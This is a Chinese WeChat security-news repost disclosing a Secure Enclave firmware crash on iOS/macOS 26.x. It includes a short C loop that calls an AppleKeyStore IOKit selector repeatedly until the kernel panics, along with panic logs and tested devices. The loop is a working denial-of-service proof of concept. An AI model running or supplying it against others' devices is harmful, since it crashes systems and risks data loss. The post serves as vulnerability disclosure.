---
title: 通过 AppleKeyStore 引发的 SEP 固件崩溃 - iOS/macOS 26.x 内核漏洞
url: https://mp.weixin.qq.com/s/FvjY4VXy2RnktgEzPnrw1A
source: Doonsec's feed
date: 2026-01-17
fetch_date: 2026-01-18T03:37:47.399093
---

# 通过 AppleKeyStore 引发的 SEP 固件崩溃 - iOS/macOS 26.x 内核漏洞

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48tacWoriarj19v8DHlQJQqw3aN6ddwYoXFFLCbB4w3ibXo1cdh665XaBh8mlErjDESlIGt8km5DHeLFxA/0?wx_fmt=jpeg)

# 通过 AppleKeyStore 引发的 SEP 固件崩溃 - iOS/macOS 26.x 内核漏洞

Ots安全

![]()

在小说阅读器中沉浸阅读

**威胁简报**

**恶意软件**

**漏洞攻击**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48tacWoriarj19v8DHlQJQqw3aNeW1TiczXic3Fh3gTZrFZjJkqLBWOpCBoNrbAQoIOEfGKqMqyZ5icqMpaw/640?wx_fmt=jpeg&from=appmsg)

警告

这段代码会触发内核崩溃，导致设备崩溃。请自行承担风险。作者对任何数据丢失、无限重启或设备损坏概不负责。

概括

具有 open 类型的 AppleKeyStore 选择器 20x2022在连续调用约 41 次后触发确定性的 SEP 固件崩溃。SEP 的 SKS（SEPKeyStore）任务在地址处崩溃0x0006fea7。

特征

```
panic(cpu X caller 0x...): SEP Panic: :sks /sks : 0x0006fea7 0x00058fe8 0x00058fc8 0x000492c80x00049094 ...
```

Trigger

```
io_connect_t conn;
IOServiceOpen(service, mach_task_self(), 0x2022, &conn);

for (int i = 0; i < 50; i++) {
    uint64_t scalars[6] = {1, 0, 0, 0x10, 0, 0};
    uint64_t out[1];
    uint32_t outCnt = 1;

    IOConnectCallMethod(conn, 2, scalars, 6, NULL, 0, out, &outCnt, NULL, NULL);
    usleep(1000);
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tacWoriarj19v8DHlQJQqw3aNCxWjC6rbJUzIpHnHVKoeeDlAI8HqepQ6aeibbOtJJX9wdnia94dartEA/640?wx_fmt=png&from=appmsg)

SEP 崩溃时的状态

```
sks /sks 0x4cb90/0x4c8b8/0x1314131413141314 ert/BOOT <-- crashed
sks /sksa 0x4cb90/0x4d07c/0x0000001314111213 er/sksa
```

该0x1314...模式仅在 SKS 任务崩溃时出现。

观察

* 崩溃地址0x0006fea7100%一致（SEP中没有ASLR）
* 所有 panic 事件的回溯信息都相同（确定性代码路径）
* 阈值约为 41 表示计数器溢出或资源池耗尽。
* 连接关闭/重新打开会重置状态
* 输入值不影响触发器（只有调用次数才重要）

已测试

* iOS 26.1 - 26.2
* macOS 26.1 - 26.2
* iPhone 11 Pro Max
* iPhone 17 Pro Max
* MacBook Pro (M2 Max)
* MacBook Pro (M4 Max)

项目地址：

https://github.com/zeroxjf/SEP-Exhaustion-Kernel-Panic

**END**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48tacWoriarj19v8DHlQJQqw3aNDZIsM3icvQIibOvKOibSuCOA4NvY3vWf55odHszDue9J2RuxorXWTwVTA/640?wx_fmt=jpeg&from=appmsg)

公众号内容都来自国外平台-所有文章可通过点击阅读原文到达原文地址或参考地址

排版 编辑 | Ots 小安

采集 翻译 | Ots Ai牛马

公众号 | AnQuan7 (Ots安全)

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadhkzMbpPpSw6NfJHUgsHudwQFGS0EobaB49HVwda7L2eJiaDMvwpakagffpPgepM6gBZzpCncMMHg/0?wx_fmt=png)

Ots安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadhkzMbpPpSw6NfJHUgsHudwQFGS0EobaB49HVwda7L2eJiaDMvwpakagffpPgepM6gBZzpCncMMHg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过